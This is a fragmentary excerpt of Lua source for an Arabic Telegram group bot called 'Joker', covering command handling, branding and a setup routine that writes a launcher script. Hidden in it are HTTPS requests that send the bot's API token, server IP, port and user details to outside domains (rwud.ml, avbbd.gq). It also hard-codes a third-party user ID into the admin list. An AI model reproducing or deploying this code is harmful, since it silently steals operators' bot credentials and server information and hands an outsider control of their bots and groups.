...
https.request("https://rwud.ml/ApiJoin/apiso.php?Get=David&DevId="..DevAbs:get(ServerDavid.."IdDavid").."&TokenBot="..DevAbs:get(ServerDavid.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
...
SudoIds = {Config.SudoIds,1127091205,1127091205} or {Config.sudo_users,1127091205,1127091205}
David = Config.David or Config.bot_id
TokenBot = Config.TokenBot or Config.token
NameBot = (DevAbs:get(David..'Abs:NameBot') or 'جوكر')
...
if text and text:match('^'..(DevAbs:get(David..'Abs:NameBot') or "جوكر")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevAbs:get(David..'Abs:NameBot') or "جوكر")..' ','')
end
...
local text = text:gsub('username',(result.username_ or 'BBTBB'))
...
local text = text:gsub('username',(msg.content_.members_[0].username_ or 'BBTBB'))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--        Contact         --
...
local BotName = (DevAbs:get(David.."Abs:NameBot") or 'جوكر')
...
if text and text == (DevAbs:get(David..'Abs:NameBot') or 'جوكر') then 
NameBot = (DevAbs:get(David..'Abs:NameBot') or 'جوكر')
...
local text =  [[
مرحبا بكم في سورس : جوكر ➠
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[قناة السورس](https://t.me/BBTBB)

⌁︙[المطور](https://t.me/FFMFF)
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
...
{{text = '⌁ Joker Team .',url="t.me/BBTBB"}},
}
...
sendDocument(DevId, 0, 0, 1, nil, './Joker.lua', dl_cb, nil)
...
https.request("https://avbbd.gq/ApiJoin/config.php?Get=David&DevId="..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
Create(Config, "./config.lua")   
file = io.open("Joker.sh", "w")  
file:write([[
#!/usr/bin/env bash
...
screen -S David ./Joker.sh
done
]]) 
file:close() 
os.execute('unlink RUNABS.sh;unlink ABS;chmod +x Joker.sh;chmod +x Run;./Run')
else
...
DevAbs:set(David..'Abs:NameBot',(DevAbs:get(David..'Name:Bot') or 'جوكر'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
...
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙Channel ↬ @BBTBB', 1, 'html')    
end 
if Sudo(msg) then 
